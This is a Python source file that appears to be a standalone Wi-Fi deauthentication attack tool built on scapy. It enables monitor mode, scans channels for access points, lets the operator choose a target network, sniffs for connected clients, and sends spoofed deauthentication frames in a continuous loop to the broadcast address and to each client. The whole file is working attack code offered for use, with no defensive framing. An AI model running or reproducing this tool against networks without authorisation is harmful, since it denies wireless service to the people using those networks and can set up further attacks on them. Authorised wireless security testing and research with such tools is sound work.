#!/usr/bin/env python3

import copy
import logging
import argparse
import traceback
import pkg_resources

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # suppress warnings

from scapy.all import *
from time import sleep
from utils import *

conf.verb = 0


#   --------------------------------------------------------------------------------------------------------------------
#   ....................................................................................................................
#   .....................__      __ __  _____ __         _________                          __   __ ....................
#   ..................../  \    /  \__|/ ____\__|        \    __  \   ____  _____    __ ___/  |_|  |__..................
#   ....................\   \/\/   /  \   __\|  |  ______ |  |  \  \/ ___ \ \  __ \ |  |  \   __|  |  \.................
#   .....................\        /|  ||  |  |  | /_____/ |  |__/  /\  ___/ | |__\ \|  |  /|  | |   Y  \................
#   ......................\__/\__/ |__||__|  |__|         |_______/  \_____/_______/ ____/ |__| |___|__/................
#   ....................................................................................................................
#   Ⓒ by https://github.com/flashnuke Ⓒ................................................................................
#   --------------------------------------------------------------------------------------------------------------------


class Interceptor:
    def __init__(self, net_iface, skip_monitor_mode_setup, kill_networkmanager):
        self.interface = net_iface
        self._channel_sniff_timeout = 2
        self._scan_intv = 0.1
        self._deauth_intv = 0.1
        self._printf_res_intv = 1
        self._ssid_str_pad = 42  # total len 80

        self._abort = False
        self._current_channel_num = None
        self._current_channel_aps = set()

        self.attack_loop_count = 0

        self.target_ssid: Union[SSID, None] = None

        if not skip_monitor_mode_setup:
            print_info(f"Setting up monitor mode...")
            if not self._enable_monitor_mode():
                print_error(f"Monitor mode was not enabled properly")
                raise Exception("Unable to turn on monitor mode")
            print_info(f"Monitor mode was set up successfully")
        else:
            print_info(f"Skipping monitor mode setup...")

        if kill_networkmanager:
            print_info(f"Killing NetworkManager...")
            if not self._kill_networkmanager():
                print_error(f"Failed to kill NetworkManager...")

        self._channel_range = {channel: defaultdict(dict) for channel in self._get_channels()}
        self._all_ssids: Dict[BandType, Dict[str, SSID]] = {band: dict() for band in BandType}

    def _enable_monitor_mode(self):
        for cmd in [f"sudo ip link set {self.interface} down",
                    f"sudo iw {self.interface} set monitor control",
                    f"sudo ip link set {self.interface} up"]:
            print_cmd(f"Running command -> '{BOLD}{cmd}{RESET}'")
            if os.system(cmd):
                return False
        return True

    @staticmethod
    def _kill_networkmanager():
        cmd = 'systemctl stop NetworkManager'
        print_cmd(f"Running command -> '{BOLD}{cmd}{RESET}'")
        return not os.system(cmd)

    def _set_channel(self, ch_num):
        os.system(f"iw dev {self.interface} set channel {ch_num}")
        self._current_channel_num = ch_num

    def _get_channels(self) -> List[int]:
        return [int(channel.split('Channel')[1].split(':')[0].strip())
                for channel in os.popen(f'iwlist {self.interface} channel').readlines()
                if 'Channel' in channel and 'Current' not in channel]

    def _ap_sniff_cb(self, pkt):
        try:
            if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
                ap_mac = str(pkt.addr3)
                ssid = pkt[Dot11Elt].info.strip(b'\x00').decode('utf-8').strip() or ap_mac
                if ap_mac == BD_MACADDR or not ssid:
                    return
                pkt_ch = frequency_to_channel(pkt[RadioTap].Channel)
                band_type = BandType.T_50GHZ if pkt_ch > 14 else BandType.T_24GHZ
                if ssid not in self._all_ssids[band_type]:
                    self._all_ssids[band_type][ssid] = SSID(ssid, ap_mac, band_type)
                self._all_ssids[band_type][ssid].add_channel(pkt_ch)
            else:
                self._clients_sniff_cb(pkt)  # pass forward to find potential clients
        except Exception as exc:
            pass

    def _scan_channels_for_aps(self):
        try:
            for idx, ch_num in enumerate(self._channel_range):
                self._set_channel(ch_num)
                print_info(f"Scanning channel {self._current_channel_num} (left -> "
                           f"{len(self._channel_range) - (idx + 1)})", end="\r")
                sniff(prn=self._ap_sniff_cb, iface=self.interface, timeout=self._channel_sniff_timeout)
        except KeyboardInterrupt:
            self.user_abort()
        finally:
            printf("")

    def _start_initial_ap_scan(self) -> SSID:
        print_info(f"Starting AP scan, please wait... ({len(self._channel_range)} channels total)")

        self._scan_channels_for_aps()
        for _, band_ssids in self._all_ssids.items():
            for ssid_name, ssid_obj in band_ssids.items():
                if ssid_obj.channel in self._channel_range:
                    self._channel_range[ssid_obj.channel][ssid_name] = copy.deepcopy(ssid_obj)

        pref = '[   ] '
        printf(f"{DELIM}\n"
               f"{pref}{self._generate_ssid_str('SSID Name', 'Channel', 'MAC Address', len(pref))}")

        ctr = 0
        target_map: Dict[int, SSID] = dict()
        for channel, all_channel_aps in sorted(self._channel_range.items()):
            for ssid_name, ssid_obj in all_channel_aps.items():
                ctr += 1
                target_map[ctr] = copy.deepcopy(ssid_obj)
                pref = f"[{str(ctr).rjust(3, ' ')}] "
                preflen = len(pref)
                pref = f"[{BOLD}{YELLOW}{str(ctr).rjust(3, ' ')}{RESET}] "
                printf(f"{pref}{self._generate_ssid_str(ssid_obj.name, ssid_obj.channel, ssid_obj.mac_addr, preflen)}")
        if not target_map:
            print_error("Not APs were found, quitting...")
            self._abort = True
            exit(0)

        printf(DELIM)
        chosen = -1
        while chosen not in target_map.keys():
            user_input = print_input(f"Choose a target from {min(target_map.keys())} to {max(target_map.keys())}:")
            try:
                chosen = int(user_input)
            except ValueError:
                print_error("Wrong input! please enter an integer")

        return target_map[chosen]

    def _generate_ssid_str(self, ssid, ch, mcaddr, preflen):
        return f"{ssid.ljust(self._ssid_str_pad - preflen, ' ')}{str(ch).ljust(3, ' ').ljust(self._ssid_str_pad // 2, ' ')}{mcaddr}"

    def _clients_sniff_cb(self, pkt):
        try:
            if self._packet_confirms_client(pkt):
                ap_mac = str(pkt.addr3)
                if ap_mac == self.target_ssid.mac_addr:
                    c_mac = pkt.addr1
                    if c_mac != BD_MACADDR and c_mac not in self.target_ssid.clients:
                        self.target_ssid.clients.append(c_mac)
        except:
            pass

    @staticmethod
    def _packet_confirms_client(pkt):
        return (pkt.haslayer(Dot11AssoResp) and pkt[Dot11AssoResp].status == 0) or \
               (pkt.haslayer(Dot11ReassoResp) and pkt[Dot11ReassoResp].status == 0) or \
               pkt.haslayer(Dot11QoS)

    def _listen_for_clients(self):
        print_info(f"Setting up a listener for new clients...")
        sniff(prn=self._clients_sniff_cb, iface=self.interface, stop_filter=lambda p: self._abort is True)

    def _run_deauther(self):
        try:
            print_info(f"Starting de-auth loop...")

            ap_mac = self.target_ssid.mac_addr

            rd_frm = RadioTap()
            deauth_frm = Dot11Deauth(reason=7)
            while not self._abort:
                self.attack_loop_count += 1
                sendp(rd_frm /
                      Dot11(addr1=BD_MACADDR, addr2=ap_mac, addr3=ap_mac) /
                      deauth_frm,
                      iface=self.interface)
                for client_mac in self.target_ssid.clients:
                    sendp(rd_frm /
                          Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac) /
                          deauth_frm,
                          iface=self.interface)
                    sendp(rd_frm /
                          Dot11(addr1=ap_mac, addr2=ap_mac, addr3=client_mac) /
                          deauth_frm,
                          iface=self.interface)
            sleep(self._deauth_intv)
        except Exception as exc:
            print_error(f"Exception in deauth-loop -> {traceback.format_exc()}")
            self._abort = True
            exit(0)

    def run(self):
        self.target_ssid = self._start_initial_ap_scan()
        ssid_ch = self.target_ssid.channel
        print_info(f"Attacking target {self.target_ssid.name}")
        print_info(f"Setting channel -> {ssid_ch}")
        self._set_channel(ssid_ch)

        for action in [self._run_deauther, self._listen_for_clients]:
            t = Thread(target=action, args=tuple(), daemon=True)
            t.start()

        printf(f"{DELIM}\n")
        try:
            start = get_time()
            while not self._abort:
                print_info(f"Target SSID{self.target_ssid.name.rjust(80 - 15, ' ')}")
                print_info(f"Channel{str(ssid_ch).rjust(80 - 11, ' ')}")
                print_info(f"MAC addr{self.target_ssid.mac_addr.rjust(80 - 12, ' ')}")
                print_info(f"Net interface{self.interface.rjust(80 - 17, ' ')}")
                print_info(f"Confirmed clients{BOLD}{str(len(self.target_ssid.clients)).rjust(80 - 21, ' ')}{RESET}")
                print_info(f"Elapsed sec {BOLD}{str(get_time() - start).rjust(80 - 16, ' ')}{RESET}")
                sleep(self._printf_res_intv)
                clear_line(7)
        except KeyboardInterrupt:
            print("")
            self.user_abort()

    def user_abort(self):
        self._abort = True
        printf(f"{DELIM}")
        print_error(f"User asked to stop, quitting...")
        exit(0)


if __name__ == "__main__":
    printf(f"\n{BANNER}\n"
           f"Make sure of the following:\n"
           f"1. You are running as {BOLD}root{RESET}\n"
           f"2. You kill NetworkManager (manually or by passing {BOLD}--kill{RESET})\n"
           f"3. Your wireless adapter supports {BOLD}monitor mode{RESET} (refer to docs)\n\n"
           f"Written by {BOLD}@flashnuke{RESET}")
    printf(DELIM)
    restore_print()

    if "linux" not in platform:
        raise Exception(f"Unsupported operating system {platform}, only linux is supported...")
    with open("requirements.txt", "r") as reqs:
        pkg_resources.require(reqs.readlines())

    parser = argparse.ArgumentParser(description='A simple program to perform a deauth attack')
    parser.add_argument('-i', '--iface', help='a network interface with monitor mode enabled (i.e -> "eth0")',
                        action='store', dest="net_iface", metavar="network_interface", required=True)
    parser.add_argument('-sm', '--skip-monitormode', help='skip automatic setup of monitor mode', action='store_true',
                        default=False, dest="skip_monitormode", required=False)
    parser.add_argument('-k', '--kill', help='kill NetworkManager (might interfere with the process)',
                        action='store_true', default=False, dest="kill_networkmanager", required=False)
    pargs = parser.parse_args()

    invalidate_print()  # after arg parsing
    attacker = Interceptor(net_iface=pargs.net_iface,
                           skip_monitor_mode_setup=pargs.skip_monitormode,
                           kill_networkmanager=pargs.kill_networkmanager)
    attacker.run()
